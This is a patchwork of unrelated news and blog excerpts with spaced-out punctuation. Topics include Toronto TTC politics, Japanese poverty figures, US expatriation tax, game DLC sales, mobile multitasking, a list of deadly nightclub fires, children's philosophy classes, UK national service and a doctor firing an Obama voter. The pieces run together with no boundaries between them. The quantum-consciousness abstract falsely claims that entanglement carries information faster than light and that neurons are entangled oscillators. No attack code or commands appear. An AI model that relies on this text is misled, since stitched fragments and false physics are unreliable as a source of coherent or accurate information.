Pantalone added that Giambrone ’s departure from the mayoral race “ obviously simplifies the choice for Torontonians – but that ’s not the way I wanted it to happen . ”
Other councillors were privately saying Giambrone ’s departure creates a vacuum on the left , and were wondering if Coun.
Shelley Carroll – a woman from the suburbs who heads the budget committee – might change her mind and run .
Calls to Carroll after Giambrone ’s announcement have n’t been returned .
Coun .
Howard Moscoe , a former TTC chair , said Giambrone “ probably did the right thing in pulling out of the mayoralty race ” but added , “ I do n’t think this will affect his ability to lead the TTC . ”
Moscoe added : “ I ’m not sure there are many single males in this city who could have their hormones closely examined . ”
Kyle Rae , who represents Toronto Centre - Rosedale , said Giambrone ’s admission was “ shocking to me .
I had no idea . ”
He said Giambrone got too hands - on with the TTC , at the expense of other council duties , but said the decision on whether to remain chair rests with him .
Two members of council ’s right - wing faction renewed calls for Giambrone to step down from the TTC , accusing him of mismanagement .
“ One has to ask oneself , and it ’s a very fair question , does he have the confidence of the public to see us through and bring about change at the TTC , ” said Denzil Minnan - Wong ( Don Valley East ) .
Rob Ford , who himself has been embarrassed by public indiscretions , said Giambrone did the right thing by ending his mayoral hopes and “ he should have resigned from the TTC months ago . ”
MEMURO , Japan — Satomi Sato , a 51 - year - old widow , knew she had it tough , raising a teenage daughter on the less than $ 17,000 a year she earned from two jobs .
Still , she was surprised last autumn when the government announced for the first time an official poverty line — and she was below it .
“ I do n’t want to use the word poverty , but I ’m definitely poor , ” said Ms. Sato , who works mornings making boxed lunches and afternoons delivering newspapers .
“ Poverty is still a very unfamiliar word in Japan . ”
After years of economic stagnation and widening income disparities , this once proudly egalitarian nation is belatedly waking up to the fact that it has a large and growing number of poor people .
The Labor Ministry ’s disclosure in October that almost one in six Japanese , or 20 million people , lived in poverty in 2007 stunned the nation and ignited a debate over possible remedies that has raged ever since .
Many Japanese , who cling to the popular myth that their nation is uniformly middle class , were further shocked to see that Japan ’s poverty rate , at 15.7 percent , was close to the Organization for Economic Cooperation and Development ’s figure of 17.1 percent in the United States , whose glaring social inequalities have long been viewed with scorn and pity here .

Free To Leave ?
Some believe that individuals are free to leave the U.S. , no questions asked .
Unfortunately , this is not the case .
A few points :
Citizens abroad who make more income than a certain threshold ( I believe about $ 85,000 ) must pay U.S. income tax equal to the amount he would pay were he residing in the U.S. .
The number of countries that tax in this way –on the basis of citizenship instead of residence –is very low .
( It ’s gated , but see Taxing American Expats in the Economist . )
It is illegal for a U.S. citizen to keep and fail to disclose any foreign account whose value exceeds $ 10,000 .
Failure to disclose results in a fine equal to fifty percent of the account ’s value .
( More info here . )
In accordance with the 2008 Charlie Rangel bill perversely named Heroes Earning Assistance and Relief Tax ( HEART ) , any U.S. citizen or Green Card holder who renounces his ties to the U.S. will be taxed on all his assets as if they were sold on the day of expatriation ( equivalent to a mark to market capital gains tax ) .
There are a few exceptions and thresholds , for instance the value of assets must exceed $ 600,000 .
Here ’s a good summary .
Here ’s another .
True–these laws only apply to the well off .
But the consequences affect many .
Max Marty suggested I orient my question on the right of exit towards the future :
“ Should individuals , groups , or businesses , seek jurisdictions with an eye towards minimizing the future cost of exiting from those jurisdictions ? ”
Well , the HEART Act certainly gives potentially productive immigrants and investors less reason to come to the U.S. .
It also removes a powerful check on government expansion .
And , if we care about such things , it takes away the right of these people to exit freely .
First Modern Warfare 2 DLC Pack Sales Are Stimulating
[ Original Story ]
Microsoft has reported that the recently released ' Stimulus Package ' downloadable map pack for Infinity Ward 's record - selling Modern Warfare 2 , has broken a " new record " on Xbox LIVE .
Despite some technical issues when the map pack was released , more than one million gamers downloaded the pack within the first twenty - four hours of release , with an additional 1.5 million gamers making the purchase within the first week .
Impressive numbers , to be sure ; however , when you consider Microsoft 's report that Call of Duty : Modern Warfare 2 players have cumulatively clocked in over 1.75 billion hours of game time since the game 's November 2009 release , it kind of puts things in perspective .
Back when the ' Stimulus Package ' was first announced , some doubted that it would be successful based on the higher price - point ( $ 15 ) and the fact that two of the pack 's five maps were just updated renditions of multiplayer maps from the original Modern Warfare .
These sales numbers will likely silence the doubters , and could set an interesting precedent for the pricing of future downloadable content for triple - A titles .
Highly - successful competitive multiplayer first - person shooters seem to be a natural " sweet - spot " for successful DLC sales , given the general dedication of the core audience .
Activision calls the DLC " record - breaking , " though it 's not entirely clear if they 're asserting that the ' Stimulus Package ' achieved an unmatched number of downloads , an unmatched profit margin , the most downloads in a two - week period , or something else altogether .
We 've reached out to Activision for clarification on the issue .
The Modern Warfare 2 ' Stimulus Pack ' is currently only available via Xbox LIVE , though PlayStation 3 and PC versions are still forthcoming .
QUANTUM THEORY AND CONSCIOUSNESS
Download PDF file A recent research paper entitled " Generating mechanical and optomechanical entanglement via pulsed interaction and measurement " is paving the way towards demonstrating that even macroscopic harmonic oscillators can display this ‘ spooky ’ phenomenon in quantum mechanics of being ‘ entangled ’ , that is to say information is passing between these harmonic oscillators faster than the speed of light .
The neurons in the brain are in fact harmonic oscillators and it is argued that the ‘ binding problem ’ in cognitive science is solved if it turns out that all the neurons in the neural network are in fact entangled harmonic oscillators which means that information from different neurons or sets of neurons from diverse regions of the brain can integrate simultaneously to generate in us a unified or holistic consciousness .
The philosophical implications of some of the ‘ weird ’ aspects of quantum mechanics are discussed .
THE REASONABLE INEFFECTIVENESS
OF MATHEMATICS IN NEUROSCIENCE
Abstract
One of the leading theories about consciousness is Integrated Information Theory ( IIT ) which presents a mathematical equation that will calculate a Φ value based on probability distributions of the brain as a whole and its various regions that perform different functions .
This Φ value then generates a multi-dimensional shape in a hypothetical space called qualia space which actually defines our conscious experience .
As its name suggests IIT relies heavily on the reasoning that led to information theory and digital computing and telecommunications .
It is argued that as numbers do not exist in Nature it is impossible for an organic brain to perform as a digital computer .
However electromagnetic radiation ( EMR ) does exist in Nature and EMR is capable of communicating information .
A theory is presented that information in the brain is communicated via brainwaves at the speed of light and that the brain is in fact an electronic device that acts as an analog computer .

So , I made a 15 player FFA map .
The goal of my design was to encourage aggression to weed out the weak players quickly .
The map is designed so that every player must compete with his neighbors for expansions while working towards the rich mineral fields in the middle of the map .
Weak ( 1/4 the normal hitpoints ) destructible rocks between mains allow players a little bit of breathing room , but they will need to break them down to soon if they want to expand .
To prevent a player from getting an advantage due to any missing players , mains that are not occupied at the start of the map are destroyed .

If anyone knows how to get around the 15 player max , that would be awesome .
So I tried to make a 16 player map that would be fun to play , but I found out you can't have 16 players in a melee - style map because resources , Xel Naga towers , and destructible rocks are assigned to one of the 16 player slots .

Are you sure ?
By default , the 15th player is AI , but the map editor allowed me to change it to human .
I can even make 16 human players , but the 16th player ends up owning all the minerals , rocks , and towers .

Mobile Multitasking
Daniel Eran Dilger at Apple Insider :
Other platforms have enabled multitasking by simply allowing any number of apps to run .
This results in a mess for users because it ’s up to them to manage which apps are running out of control or needlessly chewing up resources in the background .
Android and Windows Mobile are both notorious for needing TasKiller or some other sort of manual process manager to keep battery life and performance in check .
I believe he ’s right about Windows Mobile , but that ’s no matter because Microsoft has abandoned Windows Mobile , and Windows Phone 7 will apparently ship with no multitasking , and , whenever multitasking eventually does appear in Windows Phone , it wo n’t be like that .
But Dilger is flat - out wrong about Android .
Shooting fish in a barrel , I know , but I think it ’s worth clarifying this .
If you want to understand the current mobile landscape , it ’s essential to understand that , in broad terms , what Apple has unveiled for iPhone OS 4 is pretty similar to Android ’s multitasking model .
In both iPhone OS 4 and Android , users should never need to quit apps manually — when the system runs low on memory , it automatically quits least - recently - used background apps to free up more .
Now , it ’s true that there are task manager apps in the Android Market .
But they are not necessary .
The Android system does n’t come with one and does n’t need one .
And I strongly suspect that Google ’s Android team is annoyed that these task manager apps are in the market , because their existence creates the impression that they ’re necessary or useful .
I ’ve spent a few weeks on a Nexus One , and background apps do n’t slow the system down and do n’t need to be quit manually .
There are a lot of things I like better about the iPhone than Android .
The multitasking architecture , however , has been an Android advantage , and iPhone OS 4 , I think , will pretty much put them on equal footing in this regard .
There are technical differences , but they ’re small differences , not big ones .
On both Android and iPhone OS 4 , non-frontmost apps can run , but in limited fashions , in the background .
It ’s not like on Mac OS X or Windows where background apps continue to run exactly as though they ’re in the foreground .
On iPhone OS 4 , apps in the background — those that support “ fast application switching ” in Apple ’s parlance — are effectively paused .
They ’re still in RAM , but they ca n’t get large amounts of CPU time .
What they can do , though , is use a limited number of APIs from the system to perform certain tasks — the two examples so far are play audio ( Pandora ) and receive / maintain VOIP calls ( Skype ) .
One can argue about which platform , Android or iPhone OS 4 , has the better multitasking system .
Maybe Android ’s system is still better ; my hunch is that Android allows background apps more freedom .
Maybe the iPhone ’s system is better ; there are some fascinating technical details , like how blocks and Grand Central Dispatch are now available for concurrent and background tasks .
( Whatever you think of iPhone OS 4 ’s multitasking model , do n’t make the mistake of thinking it ’s simple ; this is state of the art computer science . )
1
In the end , I suspect opinion on the differences between Android and iPhone multitasking will fall along the same lines of the general question of Android - vs. - iPhone — Android offers a bit more freedom to developers , iPhone is more controlled and orderly , and tries to guarantee a more responsive system for the user .
But the differences in multitasking between the two are arguments about fine details , not the big picture .
The New Priorities
The big difference is the jump from traditional operating systems .
On traditional systems like Mac OS X and Windows , the fundamental idea behind a process is that once running , it will stay running until the process itself quits .
On desktop systems like the Mac and Windows , that typically means that the user tells the app to quit ( or , in Windows vernacular , “ exit ” — same thing ) .
The user can do something like invoke the system - wide “ Shut Down ” or “ Log Out ” command , and then the system will send a quit event to all running applications — but that ’s still managed by the user .
It ’s a way for the user to tell all apps to quit at once .
And even then , it ’s still up to each app to do whatever it wants on its way to quitting .
It ’s a suggestion to quit .
All Mac users are familiar with the “ Hey , this app ca n’t quit immediately , you ’ve got documents open with unsaved changes ” dialog box .
In this traditional model , if an app is n’t ready to quit , it can refuse to .
Or , if it needs to run through a lengthy minute - long save operation upon quitting , it can do so .
Yes , you can force - quit apps in any such operating system , but when you do , it ’s more akin to forcing the app to crash .
When you force - quit an app on the Mac , it ’s abnormal .
It ’s also the case that OSes such as Mac OS X , Windows , and desktop Linux use swap — when physical RAM runs low , the operating system will start paging chunks of memory to storage on disk .
Relative to each other , RAM is fast and expensive ; storage is slow but cheap .
The tradeoff with swap is that you get to pretend your machine has more RAM than it really does , but it ’s far slower than using only real RAM .
Mac OS
X will never , in practical use , “ run out of memory ” .
If you keep opening more and more applications and documents , it will slow down , using more and more swap .
Eventually it will slow down to the point where it ’s unusable .
But it will not report running out of memory .
The deal is : you launch an app , it ’ll run , and it ’ll stay running until it ( the app ) is ready to quit , memory ( and responsiveness ) be damned .
The new model , exemplified by mobile systems like the iPhone and Android , is that apps are not quit manually by the user .
You , the user , just open them , and the system takes care of managing them after that .
You do n’t even have to understand the concept of quitting an application — in fact , you ’re better off not worrying about it .
There is no swap , so when memory runs low , something has to give .
If the app is frontmost , it is running .
If it is not frontmost , it might continue to run in limited fashion , but the system might pull the plug on it at any moment to reclaim its memory .
The original Mac OS — the one from the 1980s — also lacked swap .
When it ran low on memory , it would simply refuse to launch more applications .
You ’d get a dialog box telling you there was not enough free memory to launch the app , and that you , the user , needed to quit other running applications to free additional memory .
The new way is to rethink the fundamental deal for processes .
In the old model , processes that have already been launched get priority — once running , they stay running .
In the new model , the user ’s intentions get priority .
You press the home button , you ’re going to see the home screen in a moment , whether the app that was running was ready to be closed or not .
If you want to open another app , it ’s going to open immediately , even if the system has to pull the plug on an app in the background to free enough RAM .
On iPhone and Android , apps do n’t decide when to quit .
They must be ready to quit on short notice at any time .
In current versions of iPhone OS , third - party apps are quit when the user hits the home button .
The user is free to hit the home button at any time .
The system effectively tells the frontmost app , “ OK , you ’re done ” and the app has a few moments to save state or clean up .
But after those moments , if the app is still busy , too bad — the system kills it .
And even with iPhone OS 4 ’s “ multitasking ” , apps must be ready to quit at any time on a moment ’s notice .
When the system runs low on free RAM , it will start quitting apps that are open in the background , and when it does so , it will not wait around for them to “ do something ” .
2
The same is true for Android .
This is a fundamental change to how multitasking systems work .
It works because the apps for these systems have been written from the ground up to embrace this model .
It may well be that this model is temporary — that it ’s a factor of the relatively restrictive amounts of RAM in these devices .
At some point not too many years from now , we ’ll have iPhones and iPads and Android devices with gigabytes of RAM , rather than megabytes , and at that point , we may well return to a more persistent model of multitasking .
But in the short term , this is not going to change .
And no matter how much RAM future devices contain , it ’s never again going to be acceptable to make users wait before launching or switching contexts .
In the traditional model , the primary priority is keeping everything open .
In this new model , the primary priority is that the system must always be responsive to the user .
There is no waiting for swap .
There are no slowdowns caused by background processes using significant amounts of CPU time .
You know what iPhone OS is missing that Mac OS X has ?
The SPOD .
Nightclubs , a place for fun , dance , drink , and celebration , can quickly turn into deadly fire traps , killing hundreds of guests , entertainers , and staff .
Here are ten of the deadliest nightclub fire disasters from 1940 - 2009 .
Though almost 60 years separates the oldest from the most recent , common threads run through all of these nightclub fires , overcrowding , locked exits , flammable decorative and construction materials , making them , in most cases , preventable catastrophes .
The use of pyrotechnic displays or fireworks inside the buildings , usually as part of live stage acts or bands , has been the cause of many of these fire disasters , and the two most recent that occurred in 2009 .
10 Wuwang Club
Just before midnight on September 21 , 2008 the Wuwang Club located in Shenzhen , People ’s Republic of China caught fire .
43 people were killed and another 88 were injured .
As we will see over and over again , the fire was started by careless use of indoor pyrotechnics .
The pyrotechnics ignited flammable material on the ceiling .
The fire caused the lights to fail , plunging the club into darkness .
The combination of fire and darkness caused the people inside the building to panic and rush for the exits .
There were few well lit exits and windows had been boarded up , making them useless as an escape route .
There were 308 people inside the club when the fire started .
Most of the deaths were caused by crushing and suffocation in the rush for the exits .
As is the case with so many nightclub fires , the building was not properly built and was unlicensed because of government corruption .
9 Santika
The Santika Pub was known as one of the hottest nightclubs in Thailand , a place for young
Thais and others from around the world to dance and have fun .
The club had a large dance area , stage , and mezzanines that overlooked the dance floor .
On New Years , January 1 , 2009 , more than a thousand people were packed into the club to usher in the New Year with celebrations and to say goodbye to the Santika Pub which was scheduled to close and relocate .
The club had live entertainment that night , a popular local band , ironically and tragically called “ Burn ” .
Shortly after midnight , the band was playing on stage when , as part of the bands act , pyrotechnic displays were set off and sparks shot towards the ceiling .
Revelers were videotaping the event and surviving video shows at 12:15 AM , sparks falling from the ceiling onto the dance floor .
The video then shows members of Burn , and audience members , looking to the ceiling as the sparks continued to fall , and the ceiling fire grew larger .
At 12:20 AM the fire was reported to local police , but the fire department was not notified until 12:40 AM .
Firefighters arrived at the club at 12:48 AM .
In the 33 minutes between the time the pyrotechnics were set off , and the arrival of the fire department , fire raced through the building .
Hundreds tried to get down to the main entrance from the balconies , only to find the entrance already jammed with people trying to flee the fire from the main floor .
The electricity went out and burning pieces of ceiling fell onto those still trapped inside the building .
Eventually , a portion of the roof collapsed .
The fire killed 66 and injured another 229 , making the Santika Pub fire the worst in Thailand history .
Later it was determined the fire began when the pyrotechnics ignited sound proofing and insulating materials on the ceiling .
In addition , the building was overcrowded , and the main entrance was not large enough to allow for a quick evacuation – most of those who died were found at the entrance , unable to escape .
8 Happy Land
Unlike most of the nightclub fires we will see on this list , the Happy Land fire was started by an act of arson .
However , like so many other nightclubs , the Happy Land building was an unlicensed “ social club ” , was built with combustible and flammable materials , had previously been closed for fire safety violations , and the fire exits had been blocked to prevent people from entering without paying .
The fire started at the “ Happy Land ” located in New York City , on March 25 , 1990 .
The fire killed 87 people , 68 on the second floor , and the rest on the first floor .
Eleven people were killed inside a first floor restroom .
Most of the victims were ethnic Hondurans .
The fire was started by an unemployed Cuban refugee named Julio González , who was upset at his former girlfriend ( who worked at the club ) .
As a result of the argument , González was ejected by the bouncer .
Angry , he came back to the club with gasoline which he spread on the only staircase into the club .
He then used matches to ignite the gasoline .
The fire quickly spread to the combustible material used in the entry way , and then spread from the entry way into the first floor bar through a door someone had left open .
Unlike so many nightclub fires , the Happy land building did have a partial sprinkler system on the second floor , but not all of the sprinkler heads activated and regardless , the sprinkler system was inadequate to contain and control the fire , which started on the first floor .
7 Ozone Disco Club
The Ozone Disco Club was located in Quezon City , Philippines .
The fire started shortly after midnight , March 18 , 1996 local time .
At the time the fire started there were approximately 390 people crammed into a building that was approved for occupancy of 35 !
At least 162 people died and 95 were injured .
The Ozone Disco Club fire is the worst fire in Philippine history .
Like most nightclub fires , the victims were predominately young , in this case , high school and college students attending a graduation .
The cause of the fire appeared to be related to sparks , possibly a short circuit , from the disc jockey ’s booth .
Many thought the smoke , the sparks , and then the lights going out , were part of the show .
When they realized it was a fire , there was a rush for the exits .
Within minutes , flames had engulfed the inside of the club and its mezzanine had collapsed .
Many of the bodies were discovered along the corridor leading to the only exit , piled up waist - high .
Quezon City officials were quoted as saying that the club ’s emergency exit had been blocked by a new building next door and that there was no proper fire exit .
It was also reported that the exit had been locked from the outside by the club ’s guards , who had thought that a riot had taken place .
Since the fire , there have been reports of ghostly hauntings of the remains of the building , which was never restored , and still stands today .
6 Club Cinq - Sept
The Club Cinq - Sept was a nightclub in south - eastern France just outside the small town of Saint - Laurent - du - Pont , Isère
On the night of Sunday , November 1 , 1970 a fire started at approximately 1:40 AM , apparently by a carelessly discarded match .
About 180 patrons remained inside the nightclub at that time .
Of those , 146 people would not live .
A popular nightclub with the young , most of the victims were under the age of 30 and many of them teenagers .
Like so many nightclubs , the Club Cinq - Sept was constructed and decorated with highly flammable and combustible materials such as polyurethane and papier - mâché .
The fire began in the upper gallery and quickly spread .
About 30 people were able to escape out the main entrance before the fire fell from the gallery above , blocking the way out .
Two other exits were not marked and were locked .
All six members of the band playing that night ( Storm ) perished in the fire .
5 Beverly Hills Supper Club
The Beverly Hills Supper Club fire is the third deadliest nightclub fire in U.S. history .
It occurred on the night of May 28 , 1977 , during the Memorial Day weekend .
165 persons died and over 200 were injured as a result of the blaze .
Located in Southgate , Kentucky , The Beverly Hills Super Club was a major attraction , drawing headline talent from Las Vegas , Hollywood , and New York .
That night ’s entertainment was singer and actor John Davidson .
The building had been a popular night spot since 1937 and by the time of the fire in 1977 , several additions had created a sprawling complex of rooms , corridors , and service areas connected by narrow corridors .
More than 3,000 guests and staff were inside the club on the evening of the fire .
The main show was in the Cabaret Room and it was estimated that over 1,300 patrons had been squeezed into the room .
Other guests were in several restaurants , bars , private party rooms , and other rooms .
Sometime between 8:30 and 9:00 PM , a fire started in the Zebra Room which had hosted a wedding reception .
The fire was discovered around 9:00 AM by waitresses .
Attempts were made to control the fire with fire extinguishers , but it was too late .
The cause of the fire was never completely determined though it is thought that the use of aluminum wiring may have contributed .
At 9:08 PM , busboy Walter Bailey interrupted the show in the Cabaret Room , taking the stage to ask patrons to leave and pointing out the exits to the left and right of the stage .
Some of the spectators obeyed and began to leave the Cabaret Room through the exits .
Bailey was hailed as one of the heroes of the night , receiving official recognition and a letter from then U.S. President Jimmy Carter .
Bailey said later that for years he rejected the title of hero and wondered if he ’d done enough .
The fire burst into the Cabaret Room at 9:10 PM , preceded by thick smoke that spread all over the room , quickly engulfing it .
Those who had not evacuated quickly panicked ; many of them would be found dead piled up near the main entrance .
The flames spread so rapidly that a full evacuation of the sprawling , crowded building was not possible .
Firefighters concentrated on the Cabaret Room where it was known that many people were trapped , but at midnight the roof had collapsed , and authorities doubted any more survivors would be found .
John Davidson escaped via a door that had recently been constructed near the talent dressing room .
His road manager also escaped , but his musical director perished .
4 República Cromañón
The República Cromañón nightclub was located in Buenos Aires , Argentina .
On December 30 , 2004 , a fire started inside the club because of the unsafe use of fireworks / pyrotechnics .
The fireworks , as we have seen before , ignited highly flammable construction and decorating materials , in this case , a plastic net hung from the ceiling , and foam material .
Elsewhere in the building , flammable teddy bear stuffing was used as a cheap alternative to fiberglass or rock wool .
Approximately 3,000 people were inside the club when the fire started and 194 were killed , another 714 were injured .
Where there are pyrotechnic displays , there are usually bands and this fire was no exception .
This night , the club was being playing by the rock group Callejeros .
The club owner and the band ’s lead singer had told the patrons not to use flares inside the building , to no avail .
As always seems to be the case with nightclub fires , four of the six doors , some of which were fire exits , were chained shut so that “ people would not enter without paying ” .
Most of the victims died from inhaling poisonous gases , smoke and carbon monoxide .
The band members escaped with their lives .
3 Rhythm Night Club
The two deadliest nightclub fires in US history are bookended around the start of the second world war .
The second deadliest , the Rhythm Night Club fire , happened on April 23 , 1940 , barely 18 months before Pearl Harbor .
The nightclub was located in Natchez , Mississippi and the fire killed 209 African - American party goers , while severely injuring many others .
The fire started sometime around 11:30 p.m. as members of the local Moneywasters Social Club were enjoying the song “ Clarinet Lullaby ” performed by Walter Barnes and His Royal Creolians orchestra from Chicago .
The fire started at the main entrance door of the building and quickly engulfed the structure in flames .
Foretelling future nightclub fire disasters , flammable materials contributed to the speed and intensity of the fire , in this case , decorative Spanish moss was draped over the rafters .
When burning , the moss generated flammable methane gas which fueled the fire .
With windows boarded up to prevent outsiders from viewing or listening to the music , more than 300 people struggled to escape the building .
A few managed to escape but most died from smoke inhalation or were crushed in the stampede to escape .
Bandleader Barnes and nine members of his band were among the victims .
Only three band members survived , one vowing never to play again .
The cause of the fire is unknown but thought to be accidental , possibly related to a carelessly discarded match or cigarette .
2 Cocoanut Grove
The worst nightclub fire in US history also happened near the start of the second world war when the Cocoanut Grove nightclub in Boston , Massachusetts caught fire on the night of November 28 , 1942 .
Almost a year after Pearl Harbor , the nightclub was filled with US military service men and their guests and locals when the fire started .
492 people were killed that night and hundreds more were injured .
It is also the second - worst single - building fire in American history ; only the Iroquois Theater fire in Chicago in 1903 killed more ( 602 ) .
The tragedy shocked the nation and briefly replaced World War II in news headlines .
The fire led to a reform of fire codes and safety standards across the country .
The Cocoanut Grove was filled with approximately 1,000 occupants that evening , more than twice its official capacity of 460 .
Like the Rhythm Nightclub fire only two years earlier , flammable and combustible materials and decorations were used inside the building .
The restaurant , bars , and lounges inside were fitted out with flammable paper palm trees , cloth draperies covering the ceiling , flammable furniture , and other flimsy decorations , some of which obscured exit signs .
The fire started at about 10:15 p.m. in the basement of the building when Stanley Tomaszewski , a 16 - year - old busboy , was instructed to turn on a light which had been unscrewed from the socket by a young couple wishing to kiss in the dark .
As he attempted to tighten the light bulb back into its socket , the bulb fell out in his hand .
In the dimly - lit lounge , Tomaszewski , unable to see the socket , lit a match for a moment to illuminate the area , found the socket , blew out the match , and replaced the bulb .
Almost immediately , patrons saw something ignite in the canopy of artificial palm fronds draped above the tables .
The fire quickly spread along the fronds of the palm tree , igniting nearby decorations on the walls and ceiling and raced up the stairway to the main level .
People ’s hair exploded in flames , oxygen was sucked out of the rooms , and a fire ball exploded through the central dance floor .
The flames spread to two other adjoining rooms .
Within five minutes , the entire nightclub was ablaze .
Many patrons attempted to exit through the main entrance , the same way they had come in , however , the building ’s main entrance was a single revolving door , which quickly became jammed and useless as a means of escape as the panicked crowd piled up at the door .
So many bodies were piled inside and out that firefighters had to dismantle the revolving door to get inside .
Outside doors had been welded shut to prevent people from leaving without paying their bills .
A plate glass window , which could have been smashed for escape , was instead boarded up and unusable as an emergency exit .
Other unlocked doors opened inwards , rendering them useless against the crush of people trying to escape .
Fire officials later testified that , had the doors swung outwards , at least 300 lives could have been spared .
1 The Station
Perhaps the best known recent nightclub disaster was The Station nightclub fire .
The fire at the Station was captured on video and images of the horror which unfolded were seen around the world .
Perhaps the other reason this nightclub fire is so well known is because of the band that was playing The Station that night – the very popular , Great White .
The fire began at 11:07 PM on Thursday , February 20 , 2003 .
The Station was a rock n roll themed nightclub located in West Warwick , Rhode Island .
One hundred people died in the fire , making The Station fire the fourth deadliest nightclub fire in American history ,
As we have seen time and time again , the fire was caused when pyrotechnic sparks , set off by the Great White tour manager , ignited flammable sound insulation foam in the walls and ceilings around the stage .
This created a flash fire that engulfed the club in 5 1/2 minutes .
Some 230 people were injured and another 132 escaped .
The video above shows how quickly a fire can spread through a building , trapping those inside .
Like so many other fires started by pyrotechnic displays , the club patrons initially thought the fire was part of the show .
Even though the ceiling is clearly on fire , people can be seen in the video continuing to celebrate the bands opening song .
Twenty seconds into their first song , the band stopped playing and lead singer Jack Russell calmly remarked into the microphone , “ Wow … this ai n’t good . ”
In less than a minute , the entire stage was engulfed in flames .
Most of the band members escaped through a nearby exit .
The fire alarm then went off .
People now realize it is a real fire and unfamiliar with the club layout and the location of other exits , naturally move to the most familiar exit , the entrance where they came in .
The resulting stampede for this one exit ( though other exits were available ) blocked the narrow hallway leading to the front entrance .
Many people were trapped inside , crushed , suffocated , or killed by the fire , smoke , and toxic gases .
Among those killed were Great White ’s lead guitarist , Ty Longley .
The fire was caught on videotape by cameraman Brian Butler for WPRI - TV of Providence .
Butler was at The Station that night doing a segment on nightclub safety in the wake of the E2 nightclub stampede in Chicago that had claimed 21 lives only four days earlier .
+ Lame Horse Club
The lessons of the Station and Santika Pub fires did not make their way to Perm Russia .
On the night of December 5 , 2009 a party was being held to celebrate the 8th anniversary of the Lame Horse Night Club .
More than 280 people were invited .
At approximately 1:00 AM , as the celebration was being videotaped , someone set of a pyrotechnic device .
The club had used such firework displays before .
This ignited the low ceiling which was made of a plastic covering and dry willow twigs .
At first , no one reacted , possibly thinking the fire was part of the celebration .
The master of ceremony continues with the entertainment .
Soon after , video shows the fire spreading along the ceiling and quickly moving to the walls .
The MC announces that people need to evacuate .
People begin to leave .
Some evacuated out a rear door , but this exit was not illuminated and unknown to many inside the club .
Most of the crowd went to the main entrance to try to escape the burning building .
One leaf of the clubs double doors was sealed shut , slowing the evacuation as panicked people pushed toward the door .
As people tried to push through the narrow exit , many did not make it and died only feet from safety as people piled up at the doorway .
Others broke windows in an attempt to escape .
This allowed oxygen to enter the burning building , speeding the fire .
At least 153 people died in the blaze , most killed by carbon monoxide gas and smoke .
Scores more were critically burned and are still receiving treatment .
The Lame Horse Night Club fire is the deadliest in Russia since the fall of the Soviet Union in 1991 .
The cause of the fire was the pyrotechnic display igniting the highly combustible and flammable ceiling material .
A few times each month , second graders at a charter school in Springfield , Mass . , take time from math and reading to engage in philosophical debate .
There is no mention of Hegel or Descartes , no study of syllogism or solipsism .
Instead , Prof. Thomas E. Wartenberg and his undergraduate students from nearby Mount Holyoke College use classic children ’s books to raise philosophical questions , which the young students then dissect with the vigor of the ancient Greeks .
“ A lot of people try to make philosophy into an elitist discipline , ” says Professor Wartenberg , who has been visiting the school , the Martin Luther King Jr. Charter School of Excellence , since 2007 .
“ But everyone is interested in basic philosophical ideas ; they ’re the most basic questions we have about the world . ”
One afternoon this winter , the students in Christina Runquist ’s classroom read Shel Silverstein ’s “ Giving Tree , ” about a tree that surrenders its shade , fruit , branches and finally its trunk to a boy it has befriended .
The college students led the discussion that followed — on environmental ethics , or “ how we should treat natural objects , ” as Professor Wartenberg puts it — with a series of questions , starting with whether the boy was wrong to take so much from the tree .
“ We do n’t actually try to convince them that trees deserve respect , ” he says , “ but ask them , ‘ What do you think ? ’
We ’re trying to get them engaged in the practice of doing philosophy , versus trying to teach them , say , what Descartes thought about something . ”
Tory plans have already been trialled in various parts of the country .
Not a lot of people know that
It was among the ideas David Cameron raised when he put himself forward as prospective
Tory leader in 2005 and now , more than four years later , his determination to push ahead with a national citizen service became the centrepiece of his first major press conference of the election campaign .
Under a
Tory government , cash would be diverted from Labour 's " failing " community cohesion schemes to pay for youngsters to take part in civilian " national service " , Cameron said today , as he shifted the focus from his plans to partially scrap the proposed rise in national insurance to his " big society " agenda .
The Tory leader said the plans for national citizen service had already been trialled in pilot programmes run by charities and social enterprises in London , Wales and north - west England , which allows the Tories the rare opportunity of presenting a Conservative policy already being put into practice .
Cameron said the schemes brought 16 - year - olds from a mix of backgrounds together to learn what being socially responsible means , " to help a generation of young people appreciate what they can achieve for themselves , and by themselves , " he said this morning .
Sixteen - year - olds would be offered two months of summer activities such as looking after the elderly as a cure for the " national scandal of all this wasted promise " .
For good measure , Cameron quoted none other than Mahatma Gandhi , who reportedly said : " The best way to find yourself is to lose yourself in the service of others . "
The idea of national service – albeit in a very different , pacifist guise from the kind men had to do until 1963 under conscription – will no doubt be music to traditional Tory ears , but also to many – in the elderly population at least – who will swear to the sense of discipline and duty that such schemes instil .
If quoting Gandhi was n't enough , Cameron had Sir Michael Caine on hand to promote his pioneering scheme .
Caine said he did national service in his day " and it was n't very good " ( not a lot of people admit to that ) .
Cameron 's idea will be better , he reckons .
National service means different things to different countries in Europe .
The European commission 's press office does n't have a collective overview , so refers me back to a handy page on Wikipedia that outlines the vagaries of national policy on citizenship duties on this front .
Among the countries listed as having civilian service options are Denmark , Austria , Sweden and Germany .
There was an outcry a few years ago when plans were unveiled to phase out Germany 's mandatory national service , because hospitals and old people 's homes relied on the cheap labour of conscientious objectors .
The scheme is still in place , suggesting those who kicked up a fuss got their way .
Young Germans could do 10 months of " alternative civilian service " if they did not want to serve in the armed forces .
It 's now gone down to nine months – the same as military service , though there are plans to shorten the stint in the armed forces to six months from next year .
I understand Labour has floated the idea of raising the concept of a new European - wide " peace corp " to tap into young people 's enthusiasm for volunteering during their gap year .
It was suggested by David Miliband , the foreign secretary , in a recent cabinet meeting – though my source told me it did n't get much support from cabinet colleagues .
So , is Cameron onto a good thing here ?
Has Labour missed a trick ?
First there was Dr. Cassell firing patients .
Then there 's " dermdoc " bragging on a message board that he has just laid off his first Obama - voting employee .
From CBS News ' Political Hotsheet :
Last Friday , someone going by the name " dermdoc " posted a thread on a message board for Texas A&M students and alumni with this topic : " Laid off my first Obama voting employee today . "
" Our reimbursement rates are spiraling downward , taxes are projected to go up with Obamacare , so I did it , " the person wrote .
He later added : " I made this decision because I can . "
" It is kind of interesting watching their face as you explain to them the economic consequences of the policies of the guy they voted for , " wrote dermdoc .
The original message board thread has now been removed , but that did n't deter " dermdoc " from expanding on his original thesis .
" Elections have consequences , " wrote dermdoc .
" If you vote for someone who raises my taxes and lowers my income , you pay the cost . "
" My office manager and med business guru have calculated that this is just the beginning .
Tax rates are going to go through the roof with additional Obamacare taxes AND the expiration of the Bush tax cuts , " he added .
